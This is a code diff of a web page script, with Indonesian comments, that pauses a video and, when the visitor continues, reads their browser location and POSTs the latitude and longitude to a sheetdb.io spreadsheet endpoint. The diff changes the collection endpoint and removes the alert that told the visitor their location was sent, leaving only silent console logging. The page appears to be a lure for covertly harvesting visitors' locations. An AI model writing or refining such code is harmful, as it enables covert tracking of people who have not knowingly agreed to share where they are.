@@ -22,6 +22,7 @@
 let sudah = false;
 let v = document.getElementById("vid");
 
+// pause dulu
 v.pause();
 
 function lanjut() {
@@ -34,7 +35,7 @@ function lanjut() {
       let lat = pos.coords.latitude;
       let lon = pos.coords.longitude;
 
-      fetch("https://sheetdb.io/api/v1/2ipys7fb7fh8h", {
+      fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -48,18 +49,12 @@ function lanjut() {
         })
       })
       .then(res => res.json())
-      .then(data => {
-        alert("✅ Lokasi berhasil dikirim");
-        console.log(data);
-      })
-      .catch(err => {
-        alert("❌ Gagal kirim ke Sheet");
-        console.log(err);
-      });
+      .then(data => console.log("Berhasil:", data))
+      .catch(err => console.log("Error:", err));
 
     },
     err => {
-      alert("❌ Izin lokasi ditolak / error");
+      alert("Izin lokasi ditolak");
     }
   );
 
